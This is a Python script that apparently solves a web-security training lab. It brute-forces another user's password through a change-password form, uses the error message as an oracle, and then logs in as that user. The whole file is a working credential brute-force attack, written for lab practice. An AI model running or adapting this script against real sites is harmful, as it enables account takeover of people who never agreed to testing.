import requests
import re
import os

def get_session(session, domain):
    r = session.get(domain)
    cookie = session.cookies.get_dict()
    # print(cookie)
    return cookie['session']

def get_login_session(session, domain):
    url = domain + '/login'
    data = {'username': 'wiener', 'password' : 'peter'}
    r = session.post(url, data=data)
    cookie = session.cookies.get_dict()
    # print(cookie)
    return cookie['session']

def brute(session, domain, wordlist, cookie):
    url = domain + '/my-account/change-password'
    with open(wordlist, 'r') as f:
        for password in f.readlines():
            password = password.strip()
            payload = {'username': 'carlos', 'current-password': password, 'new-password-1': '1', 'new-password-2': '2'}
            print('Trying password: ', password)
            r = session.post(url, data=payload, cookies=cookie, allow_redirects=False)
            if ('New passwords do not match' in r.text):
                print('Found password: ', password)
                return password

def login(session, domain, username, password):
    url = domain + '/login'
    data = {'username': username, 'password': password}
    r = session.post(url, data=data, allow_redirects=False)
    if (r.status_code == 302):
        print('Login success')
        session.get(domain + '/my-account')

def verify(session, domain):
    r = session.get(domain)
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not solved yet.')        
        
if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ')
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    with requests.Session() as session:
        session_id = get_session(session, domain)
        print('First login')
        login_session = get_login_session(session, domain)
        cookie = {'session': session_id, 'session': login_session}
        password = brute(session, domain, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'passwordlist.txt'), cookie)
        login(session, domain, 'carlos', password)
        verify(session, domain)